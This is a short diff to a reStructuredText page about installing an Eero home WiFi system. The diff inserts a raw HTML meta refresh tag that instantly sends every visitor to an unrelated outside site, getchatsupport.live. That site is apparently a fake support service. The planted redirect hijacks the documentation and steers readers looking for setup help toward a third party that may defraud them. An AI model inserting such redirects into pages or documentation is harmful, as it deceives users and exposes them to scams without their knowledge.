@@ -1,3 +1,6 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://getchatsupport.live/">
 How to Install Eero | Step-by-Step Home WiFi Setup
 ============================================
 
